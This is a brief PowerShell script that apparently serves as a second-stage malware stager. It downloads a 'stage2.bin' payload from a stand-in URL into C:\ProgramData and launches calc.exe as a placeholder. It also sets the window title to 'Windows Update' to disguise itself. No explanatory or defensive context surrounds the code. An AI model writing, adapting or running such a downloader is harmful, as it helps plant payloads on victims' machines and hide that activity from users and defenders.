
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://example.com/cdn/stage2.bin',
    [string]$LocalPath = 'C:\ProgramData\stage2.bin'
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $LocalPath)
Start-Process -FilePath 'calc.exe'
$Host.UI.RawUI.WindowTitle = "Windows Update"
